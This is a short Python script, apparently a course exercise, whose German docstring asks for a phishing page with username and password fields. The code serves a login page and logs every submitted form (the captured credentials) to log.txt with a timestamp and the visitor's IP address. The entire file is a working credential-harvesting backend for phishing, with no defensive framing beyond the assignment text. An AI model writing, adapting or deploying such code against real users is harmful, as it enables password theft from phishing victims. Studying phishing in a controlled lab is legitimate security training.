'''
Erstellen Sie eine (mithilfe von ChatGPT) Phishing Seite (mit CSS, HTML, PHP).
Enthalten sein soll: Felder für Loginname und Passwort, sowie ein Send-Button.

Die in das Formularfeld eingegeben Daten sollen serverseitig in einer ASCII-Textdatei gespeichert werden 
- zusammen mit einem Timestamp (Datum/Uhrzeit) des Zugriffs und der IP des "Zugreifers".
'''
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
import datetime

hostName = "localhost"
serverPort = 8080

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        file_path = Path("./login.html")
        file_content = file_path.read_text()
        
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(file_content, "utf-8"))
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        
        post_data = self.rfile.read(content_length)
        
        print(str(datetime.datetime.now()) + '  ' + self.client_address[0] + '  ' + post_data.decode('utf-8'))
        
        f = open('log.txt', 'a')
        f.write(str(datetime.datetime.now()) + '  ' + self.client_address[0] + '  ' + post_data.decode('utf-8') + '\n')
        f.close()
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        response_message = b"POST request received successfully!"
        self.wfile.write(response_message)

if __name__ == "__main__":        
    webServer = HTTPServer((hostName, serverPort), MyServer)
    print("Server started http://%s:%s" % (hostName, serverPort))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopped.")
